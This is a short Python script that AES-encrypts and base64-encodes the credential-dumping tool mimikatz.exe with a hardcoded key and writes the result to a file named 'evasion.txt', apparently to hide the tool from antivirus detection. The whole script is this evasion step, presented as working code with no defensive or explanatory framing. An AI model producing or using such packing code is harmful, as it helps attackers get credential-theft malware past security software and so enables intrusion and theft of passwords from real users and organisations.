# pip install pycryptodome

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

key = b"01234567890123456789012345678901"

data = pad(bytearray(open('mimikatz.exe', 'rb').read()), 16)

cipher = AES.new(key, AES.MODE_ECB)
msg = cipher.encrypt(data)

newFile = open("evasion.txt", "w")
newFile.write(base64.b64encode(msg).decode())
